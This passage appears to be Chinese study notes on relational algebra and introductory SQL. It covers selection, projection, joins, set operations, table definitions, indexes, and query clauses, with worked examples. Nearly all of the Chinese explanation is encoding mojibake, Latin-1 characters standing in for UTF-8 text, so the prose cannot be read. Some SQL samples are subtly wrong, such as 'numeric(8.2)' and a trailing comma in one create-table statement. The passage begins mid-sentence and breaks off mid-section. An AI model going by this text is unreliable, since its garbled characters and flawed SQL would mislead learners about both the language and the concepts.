è®ºå®ƒä»¬çš„å±æ€§æ˜¯å¦åŒ¹é…\n# é€‰æ‹©å…ƒç»„ Relation r: A\tB\tC\tD Î±\tÎ±\t1\t7 Î±\tÎ²\t5\t7 Î²\tÎ²\t12\t3 Î²\tÎ²\t23\t10 select tuples with A=B and D\u003e5 Ïƒ A=B and D\u003e5 (r) ans: A\tB\tC\tD Î±\tÎ±\t1\t7 Î²\tÎ²\t23\t10 ------------------------------ # é€‰æ‹©åˆ—(å±æ€§) Relation r: A\tB\tC Î±\t10\t1 Î±\t20\t1 Î²\t30\t1 Î²\t40\t2 select A and C Projection Î  A,C (r) ans: A\tC Î±\t1 Î²\t1 Î²\t2 ------------------------------ # è¿æ¥ä¸¤ä¸ªå…³ç³» # ç¬›å¡å°”ç§¯ Relation r,s: r A\tB Î±\t1 Î²\t2 s C\tD\tE Î±\t10\ta Î²\t10\ta Î²\t20\tb Î³\t10\tb r Ã— s: A\tB\tC\tD\tE Î±\t1\tÎ±\t10\ta Î±\t1\tÎ²\t10\ta Î±\t1\tÎ²\t20\tb Î±\t1\tÎ³\t10\tb Î²\t2\tÎ±\t10\ta Î²\t2\tÎ²\t10\ta Î²\t2\tÎ²\t20\tb Î²\t2\tÎ³\t10\tb ------------------------------ # å¹¶è¿ç®— Relation r,s: r A\tB Î±\t1 Î±\t2 Î²\t1 s A\tB Î±\t2 Î²\t3 r âˆª s: A\tB Î±\t1 Î±\t2 Î²\t1 Î²\t3 ------------------------------ # å·®è¿ç®— Relation r,s: r A\tB Î±\t1 Î±\t2 Î²\t1 s A\tB Î±\t2 Î²\t3 r - s: A\tB Î±\t1 Î²\t1 ------------------------------ # äº¤è¿ç®— Relation r,s: r A\tB Î±\t1 Î±\t2 Î²\t1 s\tA\tB Î±\t2 Î²\t3 r âˆ© s: A\tB Î±\t2 ------------------------------ # è‡ªç„¶è¿æ¥ Relation r,s r A\tB\tC\tD Î±\t1\tÎ±\ta Î²\t2\tÎ³\ta Î³\t4\tÎ²\tb Î±\t1\tÎ³\ta Î´\t2\tÎ²\tb s B\tD\tE 1\ta\tÎ± 3\ta\tÎ² 1\ta\tÎ³ 2\tb\tÎ´ 3\tb\tÎµ Natural Join r â‹ˆ\ts: A\tB\tC\tD\tE Î±\t1\tÎ±\ta\tÎ± Î±\t1\tÎ±\ta\tÎ³ Î±\t1\tÎ³\ta\tÎ± Î±\t1\tÎ³\ta\tÎ³ Î´\t2\tÎ²\tb\tÎ´ ------------------------------ # è¿æ¥ä¸¤ä¸ªå…³ç³» # ç¬›å¡å°”ç§¯ ------------------------------ SQL SQLï¼šStructured Query Language\nå•†ç”¨ç³»ç»Ÿä¸€èˆ¬æ”¯æŒsql-92çš„å¤§éƒ¨åˆ†ç‰¹æ€§ï¼Œå¹¶æ”¯æŒåç»­çš„æ‰©å……æ ‡å‡†ä¸­éƒ¨åˆ†çš„æ‰©å……ç‰¹æ€§ï¼Œä»¥åŠç³»ç»Ÿç‰¹æ®Šçš„è‡ªæœ‰ç‰¹æ€§\nä½“ç³»ç»“æ„ï¼šuser==(==\u003eview==\u003etable)==\u003ebase table==\u003e stored file\n   SQLåŠŸèƒ½ æ“ä½œç¬¦     æ•°æ®æŸ¥è¯¢ Select   æ•°æ®å®šä¹‰ Createã€Alterã€Drop   æ•°æ®æ“çºµ Insertã€Updateã€Delete   æ•°æ®æ§åˆ¶ Grantã€Revoke    æ•°æ®å®šä¹‰ **SQLçš„æ•°æ®å®šä¹‰è¯­è¨€ï¼ˆDDLï¼‰**èƒ½å¤Ÿå®šä¹‰æ¯ä¸ªå…³ç³»çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬â‘ æ¯ä¸ªå…³ç³»çš„æ¨¡å¼ï¼›â‘¡æ¯ä¸ªå±æ€§çš„å€¼åŸŸï¼›â‘¢å®Œæ•´æ€§çº¦æŸï¼›â‘£å°†æ¥çš„ä¿¡æ¯ï¼Œå¦‚æ¯ä¸ªå…³ç³»çš„ç´¢å¼•é›†åˆï¼Œæ¯ä¸ªå…³ç³»çš„å®‰å…¨æ€§å’Œæƒé™ä¿¡æ¯ï¼Œç£ç›˜ä¸Šæ¯ä¸ªå…³ç³»çš„ç‰©ç†å­˜å‚¨ç»“æ„\nSQLçš„åŸºæœ¬ç±»å‹  char(n)ï¼šå›ºå®šé•¿åº¦çš„å­—ç¬¦ä¸²ï¼Œç”¨æˆ·æŒ‡å®šé•¿åº¦n varchar(n)ï¼šå¯å˜é•¿åº¦çš„å­—ç¬¦ä¸²ï¼Œç”¨æˆ·æŒ‡å®šæœ€å¤§é•¿åº¦n intï¼šæ•´æ•°ç±»å‹ï¼ˆå’Œæœºå™¨ç›¸å…³çš„æ•´æ•°ç±»å‹çš„æœ‰é™å­é›†ï¼‰ smallintï¼šå°æ•´æ•°ç±»å‹ï¼ˆå’Œæœºå™¨ç›¸å…³çš„æ•´æ•°ç±»å‹çš„å­é›†ï¼‰ numeric(p,d)ï¼šå®šç‚¹æ•°ï¼Œç²¾åº¦ç”±ç”¨æˆ·æŒ‡å®šï¼Œè¿™ä¸ªæ•°æœ‰pä½æ•°å­—ï¼Œå…¶ä¸­dä½æ•°å­—åœ¨å°æ•°ç‚¹å³è¾¹ realï¼Œdoubleï¼Œprecisionï¼šæµ®ç‚¹æ•°ä¸åŒç²¾åº¦æµ®ç‚¹æ•°ï¼Œç²¾åº¦ä¸æœºå™¨ç›¸å…³ float(n)ï¼šæµ®ç‚¹æ•°ï¼Œç²¾åº¦ç”±ç”¨æˆ·æŒ‡å®šï¼Œç²¾åº¦è‡³å°‘ä¸ºnä½  åˆ›å»ºè¡¨ç»“æ„ ä½¿ç”¨create table å‘½ä»¤åˆ›å»ºä¸€ä¸ªSQLå…³ç³»è¡¨ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  create table r( A1 D1, A2 D2, ..., An Dn) # ræ˜¯å…³ç³»å # æ¯ä¸ªAiæ˜¯å…³ç³»æ¨¡å¼rçš„ä¸€ä¸ªå±æ€§å # Diæ˜¯å±æ€§Aiçš„åŸŸçš„ç±»å‹ #ä¾‹ create table instructor(ID\tchar(5), name\tvarchar(20)\tnot null, dept_name\tvarchar(20), salary\tnumeric(8,2) ) insert into instructor values (â€˜10211â€™, â€™Smithâ€™, â€™Biologyâ€™, 66000);   Create tableä¸­çš„å®Œæ•´æ€§çº¦æŸ  not null primary key(A1,A2,...,An) foreign key(Am,...,An) references r  æ³¨ï¼šè¢«å£°æ˜ä¸ºä¸»ç çš„å±æ€§è‡ªåŠ¨è¢«ç¡®ä¿ä¸ºnot null\nä¾‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  create table instructor( ID\tchar(5), name\tvarchar(20)\tnot null, dept_name\tvarchar(20), salary\tnumeric(8.2), primary key(ID), foreign key(dept_name) references department) create table takes( ID\tvarchar(5), course_id\tvarchar(8), sec_id\tvarchar(8), semester\tvarchar(6), year\tnumeric(4,0), grade\tvarchar(2), primary key (ID,course_id,sec_id,semester,year), foreign key (ID) references\tstudent, )   ä¸»ç çš„å£°æ˜å’Œå±æ€§çš„å£°æ˜å¯ä»¥æ”¾åœ¨ä¸€èµ·ï¼Œä¾‹å¦‚course_id\tvarchar(8) primary key,\nåˆ é™¤å’Œæ›´æ”¹è¡¨ç»“æ„ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  # åˆ é™¤è¡¨å’Œä»–çš„å†…å®¹ drop table student # åˆ é™¤è¡¨ä¸­çš„å†…å®¹,ä½†æ˜¯ä¿ç•™è¡¨ delete from student # æ›´æ”¹è¡¨ç»“æ„ alter table # å±æ€§Aæ˜¯å…³ç³»rå°†è¦å¢åŠ çš„å±æ€§,Dæ˜¯Açš„åŸŸ # å¯¹äºå…³ç³»rä¸­çš„æ‰€æœ‰å…ƒç»„,åœ¨æ–°å¢åŠ çš„å±æ€§ä¸Šçš„å–å€¼éƒ½ä¸ºnull alter table r add A D # Aæ˜¯å…³ç³»rçš„ä¸€ä¸ªå±æ€§å # è®¸å¤šæ•°æ®åº“ä¸æ”¯æŒåˆ é™¤å±æ€§çš„æ“ä½œ alter table r drop A # ä¿®æ”¹è¡¨ä¸­å±æ€§Açš„æ•°æ®ç±»å‹,å°†Açš„åŸŸæ”¹ä¸ºD # å¯èƒ½ç ´ååŸæœ‰çš„æ•°æ® alter table r modify A D   ç´¢å¼• å»ºç«‹ç´¢å¼•æ˜¯åŠ å¿«æŸ¥è¯¢é€Ÿåº¦çš„æœ‰æ•ˆæ‰‹æ®µ\nå»ºç«‹ç´¢å¼•ï¼šç”±DBAæˆ–è¡¨çš„å±ä¸»ï¼ˆå»ºç«‹è¡¨çš„äººï¼‰æ ¹æ®éœ€è¦å»ºç«‹ç´¢å¼•ï¼›æˆ–è€…æœ‰äº›DBMSè‡ªåŠ¨å»ºç«‹ç‰¹å®šåˆ—ä¸Šï¼ˆPrimary keyï¼Œuniqueï¼‰çš„ç´¢å¼•\nç»´æŠ¤ç´¢å¼•ï¼šDBMSè‡ªåŠ¨å®Œæˆ\nä½¿ç”¨ç´¢å¼•ï¼šDBMSè‡ªåŠ¨é€‰æ‹©æ˜¯å¦ä½¿ç”¨ç´¢å¼•ä»¥åŠä½¿ç”¨å“ªäº›ç´¢å¼•\nå®šä¹‰çš„æ ¼å¼\n1 2 3 4 5 6 7 8 9  create\t[unique | distinct]\t[cluster]\tindex\tindex_name\ton table_name\t(col_name\t[asc | desc]\t[,col_name asc|desc,...]) # unique(distinct):\tå”¯ä¸€æ€§ç´¢å¼•ï¼Œä¸å…è®¸è¡¨ä¸­ä¸åŒçš„è¡Œåœ¨ç´¢å¼•åˆ—ä¸Šå–ç›¸åŒçš„å€¼.è‹¥å·²æœ‰ç›¸åŒå€¼å­˜åœ¨,åˆ™ç³»ç»Ÿç»™å‡ºç›¸å…³ä¿¡æ¯,ä¸å»ºæ­¤ç´¢å¼•.ç³»ç»Ÿå¹¶æ‹’ç»è¿èƒŒå”¯ä¸€æ€§çš„æ’å…¥ã€æ›´æ–° # cluster: èšé›†ç´¢å¼•,è¡¨ä¸­å…ƒç»„æŒ‰ç´¢å¼•é¡¹çš„å€¼æ’åºå¹¶ç‰©ç†åœ°èšé›†åœ¨ä¸€èµ·.ä¸€ä¸ªåŸºæœ¬è¡¨ä¸Šåªèƒ½å»ºä¸€ä¸ªèšé›†ç´¢å¼• # asc|desc: ç´¢å¼•è¡¨ä¸­ç´¢å¼•å€¼çš„æ’åºæ¬¡åº,ç¼ºçœä¸ºasc  drop index index_name # åˆ é™¤ç´¢å¼•    ç´¢å¼•çš„æœ‰å…³è¯´æ˜   å¯ä»¥åŠ¨æ€åœ°å®šä¹‰ç´¢å¼•ï¼Œå³å¯ä»¥éšæ—¶å»ºç«‹å’Œåˆ é™¤ç´¢å¼•\n  ä¸å…è®¸ç”¨æˆ·åœ¨æ•°æ®æ“ä½œä¸­å¼•ç”¨ç´¢å¼•ã€‚ç´¢å¼•å¦‚ä½•ä½¿ç”¨å®Œå…¨ç”±ç³»ç»Ÿå†³å®šï¼Œè¿™æ”¯æŒäº†æ•°æ®çš„ç‰©ç†ç‹¬ç«‹æ€§\n  åº”è¯¥åœ¨ä½¿ç”¨é¢‘ç‡é«˜çš„ã€ç»å¸¸ç”¨äºè¿æ¥çš„åˆ—ä¸Šå»ºç´¢å¼•\n  ä¸€ä¸ªè¡¨ä¸Šå¯å»ºå¤šä¸ªç´¢å¼•ã€‚ç´¢å¼•å¯ä»¥æé«˜æŸ¥è¯¢æ•ˆç‡ï¼Œä½†ç´¢å¼•è¿‡å¤šè€—è´¹ç©ºé—´ï¼Œä¸”é™ä½äº†æ’å…¥ã€åˆ é™¤ã€æ›´æ–°çš„æ•ˆç‡\n  åˆ›å»ºç´¢å¼• 1 2 3 4 5 6 7 8 9  create\ttable\tstudent( ID\tvarchar(5), name\tvarchar(20)\tnot null, dept_name\tvarchar(20), total_credit\tnumeric(3,0)\tdefault\t0, primary\tkey(ID) ) create\tindex\tstudentID_index\ton student(ID)    ç´¢å¼•æ˜¯ä¸€ç§æ•°æ®ç»“æ„ï¼Œç”¨äºåŠ å¿«æŸ¥è¯¢åœ¨ç´¢å¼•å±æ€§ä¸Šå–ç»™å®šå€¼çš„å…ƒç»„çš„é€Ÿåº¦  ==\u003eè¯¦ç»†è§åé¢ #ç´¢å¼•\nSQLæŸ¥è¯¢çš„åŸºæœ¬ç»“æ„ **SQLçš„æ•°æ®æ“çºµè¯­è¨€ï¼ˆDMLï¼‰**æä¾›äº†ä»æ•°æ®åº“ä¸­æŸ¥è¯¢ä¿¡æ¯ï¼Œä»¥åŠåœ¨æ•°æ®åº“ä¸­æ’å…¥å…ƒç»„ã€åˆ é™¤å…ƒç»„ã€ä¿®æ”¹å…ƒç»„çš„èƒ½åŠ›\n SQLä¸­çš„æ ‡è¯†ç¬¦å¤§å°å†™ä¸æ•æ„Ÿ  Select selectå­å¥ç”¨äºåˆ—å‡ºæŸ¥è¯¢ç»“æœä¸­æ‰€éœ€è¦çš„å±æ€§ï¼Œä¸å…³ç³»ä»£æ•°ä¸­çš„æŠ•å½±è¿ç®—ç›¸å¯¹åº”\nSQLå…è®¸åœ¨å…³ç³»å’ŒæŸ¥è¯¢ç»“æœä¸­ä¿ç•™é‡å¤çš„å…ƒç»„\nå¼ºåˆ¶å»é‡ï¼Œéœ€è¦åœ¨selectä¹‹åä½¿ç”¨å…³é”®å­—distinct\n*ä¸€èˆ¬ä»£è¡¨æ‰€æœ‰å±æ€§ï¼Œæ˜¯ä¸€ä¸ªé€šé…ç¬¦\nSelectå­å¥å¯åŒ…å«+ã€-ã€*ã€/è¿ç®—ç¬¦çš„ç®—æ•°è¡¨è¾¾å¼,è¿ç®—å¯¹è±¡å¯ä»¥æ˜¯å¸¸é‡æˆ–è€…å…ƒç»„çš„å±æ€§\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  # å…¸å‹çš„æŸ¥è¯¢è¯­å¥ # Aiè¡¨ç¤ºä¸€ä¸ªå±æ€§,riè¡¨ç¤ºä¸€ä¸ªå…³ç³»,Pæ˜¯ä¸€ä¸ªè°“è¯(å³å¯ä»¥æ˜¯ä¸€ä¸ªæ¡ä»¶åˆ¤æ–­) select\tA1,A2,...,An from\tr1,r2,...,rn where\tP # å»é‡ select distinct dept_name from\tinstructor # å…³é”®è¯allæ˜¾å¼æŒ‡æ˜ä¸å»é‡å¤ select all dept_name from instructor # *ä»£è¡¨æ‰€æœ‰å±æ€§ select * from instructor # Selectå­å¥å¯åŒ…å«+ã€-ã€*ã€/è¿ç®—ç¬¦çš„ç®—æ•°è¡¨è¾¾å¼,è¿ç®—å¯¹è±¡å¯ä»¥æ˜¯å¸¸é‡æˆ–è€…å…ƒç»„çš„å±æ€§ select\tID,name,salary/12 from instructor   where whereå­å¥æŒ‡å®šæŸ¥è¯¢ç»“æœå¿…é¡»æ»¡è¶³çš„æ¡ä»¶ï¼Œä¸å…³ç³»ä»£æ•°ä¸­çš„é€‰æ‹©è°“è¯ç›¸å¯¹åº”\næ¯”è¾ƒç»“æœå¯ä»¥ä½¿ç”¨é€»è¾‘è¿è¯andï¼Œorï¼Œnotè¿æ¥\næ¯”è¾ƒç»“æœå¯ä»¥ç”¨äºç®—æœ¯è¡¨è¾¾å¼\n è¯­æ³•æˆåˆ†ï¼š\n é€»è¾‘è¿ç®—ç¬¦ï¼šandï¼Œorï¼Œnot æ¯”è¾ƒè¿ç®—ç¬¦ï¼š\u003cï¼Œ\u003c=ï¼Œ\u003eï¼Œ\u003e=ï¼Œ=ï¼Œ\u003c\u003e betweenæ¡ä»¶ï¼šåˆ¤æ–­è¡¨è¾¾å¼çš„å€¼æ˜¯å¦åœ¨æŸèŒƒå›´å†…ï¼Œä¾‹å¦‚ age between 18 and 20 ==ageâˆˆ[18,20]ï¼Œnot between ... and ...    1 2 3 4 5 6  # æ‰¾å‡ºæ‰€æœ‰åœ¨Computer Scienceç³»å¹¶ä¸”å·¥èµ„è¶…è¿‡80000ç¾å…ƒçš„æ•™å¸ˆçš„å§“å select\tname from\tinstructor where dept_name = 'Computer Science' and salary \u003e 80000   from fromå­å¥åˆ—å‡ºäº†æŸ¥è¯¢ä¸­çš„åŒ…å«å…³ç³»ï¼Œä¸å…³ç³»ä»£æ•°ä¸­çš„ç¬›å¡å°”ç§¯è¿ç®—ç›¸å¯¹åº”\nç¬›å¡å°”ç§¯ä¸æ˜¯ç»å¸¸è¢«ç›´æ¥ä½¿ç”¨ï¼Œä»–åœ¨ä½¿ç”¨æ—¶ç»å¸¸ä¸whereå­å¥ï¼ˆå…³ç³»ä»£æ•°çš„é€‰æ‹©æ“ä½œï¼‰ä¸€èµ·ä½¿ç”¨\n1 2 3 4 5 6  # æ±‚ç¬›å¡å°”ç§¯instructor Ã— teacher # äº§ç”Ÿæ‰€æœ‰çš„instructor-teacherå¯¹,åŒ…å«ä¸¤ä¸ªå…³ç³»çš„æ‰€æœ‰å±æ€§ select\t* from\tinstructor, teacher   è¿æ¥ 1 2 3 4 5 6  # ä¾‹ # å¯¹äºå¤§å­¦æ‰€æœ‰è®²æˆè¯¾ç¨‹çš„æ•™å¸ˆ,æ‰¾å‡ºä»–ä»¬çš„å§“åä»¥åŠæ‰€è®²æˆçš„è¯¾ç¨‹çš„æ ‡è¯† select\tname,course_id from instructor,teacher where instructor.ID = teacher.ID   è¿æ¥æŸ¥è¯¢åŠæ‰§è¡Œè¿‡ç¨‹ åŒæ—¶æ¶‰åŠå¤šä¸ªè¡¨çš„æŸ¥è¯¢ç§°ä¸ºè¿æ¥æŸ¥è¯¢\nç”¨æ¥è¿æ¥ä¸¤ä¸ªè¡¨çš„æ¡ä»¶ç§°ä¸ºè¿æ¥æ¡ä»¶æˆ–è¿æ¥è°“è¯\nä¸€èˆ¬æ ¼å¼ï¼š[\u003ctable_name1\u003e.]\u003ccol_name1\u003e\u003cæ¯”è¾ƒè¿ç®—ç¬¦\u003e[\u003ctable_name2\u003e.]\u003ccol_name2\u003e\n[\u003ctable_name1\u003e.]\u003ccol_name1\u003e between [\u003ctable_name2\u003e.]\u003ccol_name2\u003e AND [\u003ctable_name3\u003e.]\u003ccol_name3\u003e\nè¿æ¥å­—æ®µï¼šè¿æ¥è°“è¯ä¸­çš„åˆ—åç§°ä¸ºè¿æ¥å­—æ®µã€‚è¿æ¥æ¡ä»¶ä¸­çš„å„è¿æ¥å­—æ®µç±»å‹å¿…é¡»æ˜¯å¯æ¯”çš„ï¼Œä½†ä¸å¿…æ˜¯ç›¸åŒçš„\n   åµŒå¥—å¾ªç¯æ³•ï¼ˆNested-Loopï¼‰\n é¦–å…ˆåœ¨è¡¨1ä¸­æ‰¾åˆ°ç¬¬ä¸€ä¸ªå…ƒç»„ï¼Œç„¶åä»å¤´å¼€å§‹æ‰«æè¡¨2ï¼Œé€ä¸€æŸ¥æ‰¾æ»¡è¶³è¿æ¥ä»¶çš„å…ƒç»„ï¼Œæ‰¾åˆ°åå°±å°†è¡¨1ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç»„ä¸è¯¥å…ƒç»„æ‹¼æ¥èµ·æ¥ï¼Œå½¢æˆç»“æœè¡¨ä¸­ä¸€ä¸ªå…ƒç»„ã€‚ è¡¨2å…¨éƒ¨æŸ¥æ‰¾å®Œåï¼Œå†æ‰¾è¡¨1ä¸­ç¬¬äºŒä¸ªå…ƒç»„ï¼Œç„¶åå†ä»å¤´å¼€å§‹æ‰«æè¡¨2ï¼Œé€ä¸€æŸ¥æ‰¾æ»¡è¶³è¿æ¥æ¡ä»¶çš„å…ƒç»„ï¼Œæ‰¾åˆ°åå°±å°†è¡¨1ä¸­çš„ç¬¬äºŒä¸ªå…ƒç»„ä¸è¯¥å…ƒç»„æ‹¼æ¥èµ·æ¥ï¼Œå½¢æˆç»“æœè¡¨ä¸­ä¸€ä¸ªå…ƒç»„ é‡å¤ä¸Šè¿°æ“ä½œï¼Œç›´åˆ°è¡¨1ä¸­çš„å…¨éƒ¨å…ƒç»„éƒ½å¤„ç†å®Œæ¯•       æ’åºåˆå¹¶æ³•ï¼ˆSort-Mergeï¼‰\n é¦–å…ˆæŒ‰ç…§è¿æ¥å±æ€§å¯¹è¡¨1å’Œè¡¨2æ’åº å¯¹è¡¨1çš„ç¬¬ä¸€ä¸ªå…ƒç»„ï¼Œä»å¤´å¼€å§‹æ‰«æè¡¨2ï¼Œé¡ºåºæŸ¥æ‰¾æ»¡è¶³è¿æ¥æ¡ä»¶çš„å…ƒç»„ï¼Œæ‰¾åˆ°åå°±å°†è¡¨1ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç»„ä¸è¯¥å…ƒç»„æ‹¼æ¥èµ·æ¥ï¼Œå½¢æˆç»“æœè¡¨ä¸­ä¸€ä¸ªå…ƒç»„ã€‚å½“é‡åˆ°è¡¨2ä¸­ç¬¬ä¸€æ¡å¤§äºè¡¨1è¿æ¥å­—æ®µå€¼çš„å…ƒç»„æ—¶ï¼Œå¯¹è¡¨2çš„æŸ¥è¯¢ä¸å†ç»§ç»­ æ‰¾åˆ°è¡¨1çš„ç¬¬äºŒæ¡å…ƒç»„ï¼Œç„¶åä»åˆšæ‰çš„ä¸­æ–­ç‚¹å¤„ç»§ç»­é¡ºåºæ‰«æè¡¨2ï¼ŒæŸ¥æ‰¾æ»¡è¶³è¿æ¥æ¡ä»¶çš„å…ƒç»„ï¼Œæ‰¾åˆ°åå°±å°†è¡¨1ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç»„ä¸è¯¥å…ƒç»„æ‹¼æ¥èµ·æ¥ï¼Œå½¢æˆç»“æœè¡¨ä¸­ä¸€ä¸ªå…ƒç»„ã€‚ç›´æ¥é‡åˆ°è¡¨2ä¸­å¤§äºè¡¨1è¿æ¥å­—æ®µå€¼çš„å…ƒç»„æ—¶ï¼Œå¯¹è¡¨2çš„æŸ¥è¯¢ä¸å†ç»§ç»­ é‡å¤ä¸Šè¿°æ“ä½œï¼Œç›´åˆ°è¡¨1æˆ–è¡¨2ä¸­çš„å…¨éƒ¨å…ƒç»„éƒ½å¤„ç†å®Œæ¯•ä¸ºæ­¢       ç´¢å¼•è¿æ¥æ³•ï¼ˆIndex-Joinï¼‰\n å¯¹è¡¨2æŒ‰è¿æ¥å­—æ®µå»ºç«‹ç´¢å¼• å¯¹è¡¨1ä¸­çš„æ¯ä¸ªå…ƒç»„ï¼Œä¾æ¬¡æ ¹æ®å…¶è¿æ¥å­—æ®µå€¼æŸ¥è¯¢è¡¨2çš„ç´¢å¼•ï¼Œä»ä¸­æ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„å…ƒç»„ï¼Œæ‰¾åˆ°åå°±å°†è¡¨1ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç»„ä¸è¯¥å…ƒç»„æ‹¼æ¥èµ·æ¥ï¼Œå½¢æˆç»“æœè¡¨ä¸­ä¸€ä¸ªå…ƒç»„     è‡ªç„¶è¿æ¥ è‡ªç„¶è¿æ¥åªè€ƒè™‘ä¸¤ä¸ªå…³ç³»æ¨¡å¼ä¸­éƒ½å‡ºç°çš„å±æ€§ä¸Šå–å€¼ç›¸åŒçš„å…ƒç»„å¯¹ï¼Œå¹¶ä¸”ç›¸åŒå±æ€§çš„åˆ—åªä¿ç•™ä¸€ä¸ªå‰¯æœ¬\n1 2 3 4 5 6 7 8 9  select\t* from\tinstructor\tnatural join\tteacher select\tname,course_id from\tinstructor, teacher where\tinstructor.iD = teacher.ID || select\tname,course_id from instructor natural join\tteacher   è‡ªç„¶è¿æ¥ä¸­çš„å±é™©ï¼šæœ‰äº›å±æ€§å¯èƒ½å…·æœ‰ç›¸åŒçš„åç§°ï¼Œä½†æ˜¯ä»–ä»¬çš„å®é™…æ„ä¹‰æ˜¯ä¸åŒçš„ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä»–ä»¬å¯èƒ½è¢«é”™è¯¯çš„è®¤ä¸ºæ˜¯ç›¸åŒå±æ€§\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  # ä¾‹ # é”™è¯¯çš„å†™æ³•(ä½¿course.dept_name = instructor.dept_name) select name, title from instructor natural join teaches natural join course; # æ­£ç¡®çš„å†™æ³• select name, title from instructor natural join teaches, course where teaches.course_id = course.course_id; # å¦ä¸€ä¸ªæ­£ç¡®çš„å†™æ³• select name, title from (instructor natural join teaches) join course using(course_id);   æ›´åè¿ç®— SQLå…è®¸ä½¿ç”¨aså­å¥å¯¹å…³ç³»å’Œå±æ€§è¿›è¡Œæ›´å\n1  old_name as new_name    åœ¨Oracleä¸­ï¼Œå…³é”®è¯aså¿…é¡»è¢«çœç•¥  1 2 3 4 5 6 7 8  #ä¾‹ select\tID,name,salary/12 as monthly_salary from instructor # æ‰¾å‡ºæ»¡è¶³å·¥èµ„è‡³å°‘æ¯”Computer Scienceç³»æŸä¸€ä¸ªæ•™å¸ˆçš„å·¥èµ„è¦é«˜çš„æ•™å¸ˆå§“å select\tdistinct\tT.name from instructor\tas T,instructor\tas S where\tT.salary \u003e S.salary\tand\tS.dept_name = 'Computer Science'   å­—ç¬¦ä¸²è¿ç®— SQLä¸­é€šè¿‡å­—ç¬¦ä¸²åŒ¹é…è¿ç®—æ¥æ”¯æŒåœ¨å­—ç¬¦ä¸²ä¸Šçš„æ¯”è¾ƒï¼Œä½¿ç”¨likeæ“ä½œç¬¦æ¥å®ç°æ¨¡å¼åŒ¹é…ï¼Œä½¿ç”¨ä¸¤ä¸ªç‰¹æ®Šå­—ç¬¦ï¼ˆé€šé…ç¬¦ï¼‰æè¿°æ¨¡å¼\n ç™¾åˆ†å·ï¼ˆ%ï¼‰ï¼š%å­—ç¬¦åŒ¹é…ä»»ä½•å­ä¸² ä¸‹åˆ’çº¿ï¼ˆ_ï¼‰ï¼š_å­—ç¬¦åŒ¹é…ä»»ä½•å­—ç¬¦ Likeçš„å•å‘æ€§ï¼š  'æµå—å¸‚å±±å¤§è·¯' like 'æµå—å¸‚%' = true  'æµå—å¸‚%' like 'æµå—å¸‚å±±å¤§è·¯' = false    1 2 3 4 5 6 7 8  # ä¾‹ # æ‰¾å‡ºåå­—ä¸­åŒ…å«darçš„æ•™å¸ˆåå­— select\tname from\tinstructor where\tname like '%dar%' # åŒ¹é…å­—ç¬¦ä¸²â€œ100 %â€ str like '100 \\%' escape '\\'   Escape Escapeå®šä¹‰è½¬ä¹‰å­—ç¬¦ï¼Œä»¥å»æ‰ç‰¹æ®Šå­—ç¬¦çš„ç‰¹å®šå«ä¹‰ï¼Œä½¿å…¶è¢«ä½œä¸ºæ™®é€šå­—ç¬¦å¯¹å¾…ï¼Œå¦‚ç”¨escape '\\'ï¼Œå®šä¹‰\\ä½œä¸ºè½¬ä¹‰å­—ç¬¦ï¼Œåˆ™å¯ç”¨\\%å»åŒ¹é…%ï¼Œç”¨\\_å–åŒ¹é…_\n1 2  'ab\\%cd%' escape '\\'\t= 'ab%cd' 'ab\\\\cd%' escape '\\'\t= 'ab\\cd'   VALUEæ˜¯å¤§å°å†™æ•æ„Ÿçš„\n   æ¨¡å¼åŒ¹é…çš„ä¾‹å­ï¼š\n â€˜Intro%â€™ åŒ¹é…ä»»ä½•ä»¥â€œIntroâ€æ‰“å¤´çš„å­—ç¬¦ä¸² â€˜%Comp%â€™ åŒ¹é…ä»»ä½•åŒ…å«â€œCompâ€ å­ä¸²çš„å­—ç¬¦ä¸² â€˜_ _ _â€™åŒ¹é…åªå«ä¸‰ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸² â€˜_ _ _ %â€™åŒ¹é…è‡³å°‘å«ä¸‰ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²    SQL æ”¯æŒä¸€ç³»åˆ—çš„ä¸²è¿ç®—ï¼ŒåŒ…æ‹¬\n ä¸²è” ï¼ˆä½¿ç”¨â€œ||â€ï¼‰ å¤§å°å†™è½¬æ¢ è®¡ç®—ä¸²é•¿åº¦, æŠ½å–å­ä¸², ç­‰ç­‰     æ’åˆ—å…ƒç»„çš„æ˜¾ç¤ºæ¬¡åº 1 2 3 4 5 6 7 8 9 10 11 12  # ä¾‹ # æŒ‰å­—æ¯é¡ºåºæ’åˆ—å‡ºæ‰€æœ‰æ•™å¸ˆçš„åå­— select\tdistinct\tname from\tinstructor order by name # æˆ‘ä»¬å¯ä»¥ç”¨descæŒ‡å®šé™åº,ç”¨ascæŒ‡å®šå‡åº,é»˜è®¤æƒ…å†µä¸‹æ˜¯å‡åºæ’åˆ— order by name desc # å¯ä»¥åœ¨å¤šä¸ªå±æ€§ä¸Šè¿›è¡Œæ’åº order by dept_name,name   åªæ˜¯æ˜¾ç¤ºæ¬¡åºæ’åºï¼Œåªèƒ½æ˜¯sqlçš„æœ€åä¸€ä¸ªå­å¥ï¼Œåªèƒ½å‡ºç°ç›®æ ‡åˆ—å†…çš„å­—æ®µ\nå½“æ’åºåˆ—å«ç©ºå€¼æ—¶ï¼ŒASCæ’åºåˆ—ä¸ºç©ºå€¼çš„å…ƒç»„æœ€åæ˜¾ç¤ºï¼ŒDESCæ’åºåˆ—ä¸ºç©ºå€¼çš„å…ƒç»„æœ€å…ˆæ˜¾ç¤º\nwhereå­å¥è°“è¯ 1 2 3 4 5 6 7 8 9  # å…ƒç»„æ¯”è¾ƒ select\tname,course_id from\tinstructor, teacher where\t(instructor.ID, dept_name) = (teacher.ID, 'Biology') # è¡¨ç¤ºæ–¹æ³•: (v1,v2,...,vn) # å…ƒç»„æ¯”è¾ƒ: 